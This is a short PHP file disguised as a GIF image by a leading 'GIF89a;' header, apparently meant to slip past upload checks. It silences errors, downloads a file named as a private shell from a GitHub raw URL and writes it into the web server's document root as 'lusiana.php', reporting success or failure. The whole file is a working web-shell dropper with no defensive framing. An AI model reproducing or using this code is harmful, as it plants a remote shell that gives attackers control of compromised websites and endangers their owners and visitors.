GIF89a;
<?php
error_reporting(0);
$filename="lusiana.php";
$fget=file_get_contents("https://raw.githubusercontent.com/aprilc0de/Shell-Private/master/shell_priv8_U48.php");
$path=$_SERVER['DOCUMENT_ROOT'];
$fileopen=fopen($_SERVER['DOCUMENT_ROOT']."/$filename",'w');  
$execfile=fwrite($fileopen,$fget);
	if($execfile)
	{
		echo "Success: $path$filename";
	}
	else {
		echo "Failed execute newfile $filename in $path";
	}
?>
